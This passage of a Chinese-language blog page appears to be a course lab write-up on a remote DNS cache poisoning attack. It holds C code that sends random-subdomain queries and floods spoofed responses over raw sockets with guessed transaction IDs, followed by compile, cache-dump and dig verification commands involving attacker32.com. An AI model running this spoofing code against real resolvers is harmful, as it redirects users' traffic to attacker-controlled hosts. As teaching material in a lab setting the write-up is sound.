class="hljs-string">&quot;ip_resp.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>  <span class="hljs-keyword">if</span> (!f_resp) &#123;<br>     perror(<span class="hljs-string">&quot;Can&#x27;t open &#x27;ip_resp.bin&#x27;&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ip_resp[MAX_FILE_SIZE];<br>  <span class="hljs-type">int</span> n_resp = fread(ip_resp, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_resp);<br><br>  <span class="hljs-type">char</span> a[<span class="hljs-number">26</span>]=<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-comment">// Generate a random name with length 5 构造长度为5的二级域名</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">6</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>; k&lt;<span class="hljs-number">5</span>; k++)  name[k] = a[rand() % <span class="hljs-number">26</span>];<br>    name[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;attempt #%ld. request is [%s.example.com], transaction ID is: [%hu]\</span><br><span class="hljs-string">n&quot;</span>, ++i, name, transaction_id);<br><br>    <span class="hljs-comment">// Step 1. Send a DNS request to the targeted local DNS server</span><br>    send_dns_request(ip_req, n_req, name);<br><br>    <span class="hljs-comment">/* Step 2. Send spoofed responses to the targeted local DNS server.</span><br><span class="hljs-comment">     *         The two IP addresses are example.com&#x27;s actual nameservers. </span><br><span class="hljs-comment">     *         We don&#x27;t know which one is used by the local DNS server, so</span><br><span class="hljs-comment">     *         we spoof the responses from both.    */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SPOOF_PER_REQUEST; j++)&#123;<br>       send_dns_response(ip_resp, n_resp, NS1, name, transaction_id);<br>       send_dns_response(ip_resp, n_resp, NS2, name, transaction_id);<br>       transaction_id = transaction_id + <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/* The template has a fixed &quot;aaaaa&quot; in the name field; we need </span><br><span class="hljs-comment"> *   to replace it with the actual name randomly generated from </span><br><span class="hljs-comment"> *   the attack. */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_request</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *ip_req, <span class="hljs-type">int</span> n_req, <span class="hljs-type">char</span> * name)</span> <br>&#123;<br><br>    <span class="hljs-comment">// Modify the name in the question field (offset=41)</span><br>    <span class="hljs-built_in">memcpy</span>(ip_req+<span class="hljs-number">41</span>, name, <span class="hljs-number">5</span>);<br><br>    <span class="hljs-comment">// Send the IP packet out</span><br>    send_raw_packet(ip_req, n_req);<br>&#125;<br><br><span class="hljs-comment">/* We need to modify several fields in the template, including</span><br><span class="hljs-comment"> *   the source IP address, the two name fields (in question and answer</span><br><span class="hljs-comment"> *   sections), and the transaction ID.  */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_response</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *ip_resp, <span class="hljs-type">int</span> n_resp, </span><br><span class="hljs-params">            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *src_ip, <span class="hljs-type">char</span> * name, </span><br><span class="hljs-params">            <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> transaction_id)</span> <br>&#123;<br>    <span class="hljs-comment">// Modify the src IP in the IP header (offset=12)</span><br>    <span class="hljs-type">int</span> ip = (<span class="hljs-type">int</span>) inet_addr(src_ip);<br>    <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">12</span>, (<span class="hljs-type">void</span> *) &amp;ip, <span class="hljs-number">4</span>);<br><br>    <span class="hljs-comment">// Modify the name in the question field (offset=41)</span><br>    <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">41</span>, name, <span class="hljs-number">5</span>);<br><br>    <span class="hljs-comment">// Modify the name in the answer field (offset=64)</span><br>    <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">64</span>, name, <span class="hljs-number">5</span>);<br><br>    <span class="hljs-comment">// Modify the transaction ID field (offset=28)</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> id[<span class="hljs-number">2</span>];<br>    *id = htons(transaction_id);<br>    <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">28</span>, (<span class="hljs-type">void</span> *) id, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">// Send the IP packet out</span><br>    send_raw_packet(ip_resp, n_resp);<br>&#125;<br><br><br><span class="hljs-comment">/* Send the raw packet out */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_raw_packet</span><span class="hljs-params">(<span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size)</span><br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">dest_info</span>;</span><br>  <span class="hljs-type">int</span> enable = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">// Step 1: Create a raw network socket.</span><br>  <span class="hljs-type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<br><br>  <span class="hljs-comment">// Step 2: Set socket option.</span><br>  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,<br>             &amp;enable, <span class="hljs-keyword">sizeof</span>(enable));<br><br>  <span class="hljs-comment">// Step 3: Provide needed information about destination.</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> *<span class="hljs-title">ip</span> =</span> (<span class="hljs-keyword">struct</span> ipheader *) buffer;<br>  dest_info.sin_family = AF_INET;<br>  dest_info.sin_addr = ip-&gt;iph_destip;<br><br>  <span class="hljs-comment">// Step 4: Send the packet out.</span><br>  sendto(sock, buffer, pkt_size, <span class="hljs-number">0</span>,<br>       (<span class="hljs-keyword">struct</span> sockaddr *)&amp;dest_info, <span class="hljs-keyword">sizeof</span>(dest_info));<br></code></pre></td></tr></table></figure>
+<p>2、打开ip_req.bin，得到域名起始位置的偏移量为0x29，即十进制的41。</p>
+
+<p>3、打开ip_resp.bin，得到域名其实位置的偏移量为0x40，及十进制的64。</p>
+
+<p>4、编译运行攻击代码：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">gcc -o remote<span class="hljs-emphasis">_attack remote_attack.c</span><br><span class="hljs-emphasis">./remote_</span>attack<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.8.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>5、在本地域名服务器以下执行命令，检测缓存：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">rndc dumpdb -cache &amp;&amp; <span class="hljs-keyword">grep</span> attacker <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/bind/</span><span class="hljs-keyword">dump</span>.db<br></code></pre></td></tr></table></figure>
+<p>可能需要等待较长时间才能有攻击效果。</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.9.jpg" srcset="/img/loading.gif" lazyload class="">
+<h1>Task 5: Result Verifification</h1>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">dig</span> www.example.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.11.jpg" srcset="/img/loading.gif" lazyload class="">
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">dig</span> aaaaa.example.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.12.jpg" srcset="/img/loading.gif" lazyload class="">
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dig @ns<span class="hljs-selector-class">.attacker32</span><span class="hljs-selector-class">.com</span> www<span class="hljs-selector-class">.example</span>.com<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.13.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>被攻击的DNS服务器不会使用回复中提供的IP地址，而是会发出一个新的请求亲自查询ns.attacker32.com的真实ip地址， 攻击者必须真正拥有attacker32.com这个域名才有机会回应这个请求，并提供他们选择的IP地址（？）</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%AF%BE%E7%A8%8B%E5%AE%9E%E9%AA%8C/" class="category-chain-item">网络攻防课程实验</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/" title="Lab12-幽灵攻击">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Lab12-幽灵攻击</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/" title="Lab11-DNS欺骗_Local">
+                        <span class="hidden-mobile">Lab11-DNS欺骗_Local</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Inhaltsverzeichnis</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
